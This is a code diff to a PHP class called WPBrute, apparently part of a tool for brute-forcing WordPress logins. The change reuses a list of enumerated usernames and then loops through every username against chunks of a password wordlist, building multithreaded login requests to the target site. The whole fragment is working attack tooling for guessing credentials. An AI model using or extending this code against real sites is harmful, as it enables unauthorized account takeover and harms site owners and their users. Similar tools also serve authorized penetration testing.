@@ -2,7 +2,7 @@
 
 class WPBrute {
 
-    var $url;
+    var $url, $usernames;
 
     function __construct($url) {
         $this->url = $url;
@@ -18,8 +18,13 @@ class WPBrute {
                 return false;
             }
         }
-        $usernames = $this->getList('bfuser');
-        if(!$usernames) return false;
+        if( !Config::get('ufound') ) {
+            $this->usernames = $this->getList('bfuser');
+            if(!$this->usernames) return false;
+        } elseif(!$this->usernames) {
+            msg("[-] No usernames enumerated, bruteforce halted");
+            return false;
+        }
         $passwords = $this->getList('bfwordlist');
         if(!$passwords) return false;
         if( Config::get('thread') ) {
@@ -28,7 +33,7 @@ class WPBrute {
             $threads = 10;
         }
         $chunks = array_chunk($passwords, $threads);
-        foreach ($usernames as $username) {
+        foreach ($this->usernames as $username) {
             foreach ($chunks as $passwordsChunk) {
                 foreach ($passwordsChunk as $i => $password) {
                     $urls[] = $this->url.'/'.$method.'.php';
